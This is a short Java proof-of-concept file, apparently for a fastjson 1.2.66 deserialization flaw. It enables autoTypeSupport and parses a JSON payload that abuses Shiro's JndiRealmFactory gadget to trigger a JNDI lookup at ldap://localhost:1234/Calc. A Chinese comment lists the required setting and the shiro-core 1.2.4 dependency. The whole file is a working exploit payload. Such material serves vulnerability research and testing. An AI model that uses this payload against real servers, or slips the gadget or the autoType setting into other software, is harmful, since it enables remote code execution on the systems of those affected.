package Poc;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import java.rmi.server.ExportException;
/*
    需要开启autoTypeSupport
    <dependency>
        <groupId>org.apache.shiro</groupId>
          <artifactId>shiro-core</artifactId>
        <version>1.2.4</version>
    </dependency>
*/
public class Poc_1_2_66_a {
    public static void main(String[] args) throws ExportException {
        // turn on autoTypeSupport
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://localhost:1234/Calc\"], \"Realms\":[\"\"]}";
        JSON.parse(payload);
    }
}
